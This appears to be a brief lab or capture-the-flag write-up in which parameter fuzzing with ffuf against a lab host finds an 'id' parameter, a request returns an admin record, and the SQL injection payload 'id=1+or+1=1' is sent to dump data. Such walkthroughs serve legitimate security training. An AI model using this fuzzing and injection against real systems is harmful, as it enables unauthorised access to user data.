# Information Disclosure (with a twist of SQLi)

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u  http://10.129.202.133:3003/?FUZZ=test -fs 19
```

```bash
curl http://10.129.202.133:3003/?id=1
```

```json
 {  
   "id": "1",  
   "username": "admin",  
   "position": "1"  
 }
```

![Pasted image 20241014190816.png](../../assets/images/d5b2128143d2b430b172.png)

```bash
curl http://10.129.202.133:3003/?id=1+or+1=1
```

![Pasted image 20241014190952.png](../../assets/images/abf6b16ca83af2f4a9b3.png)
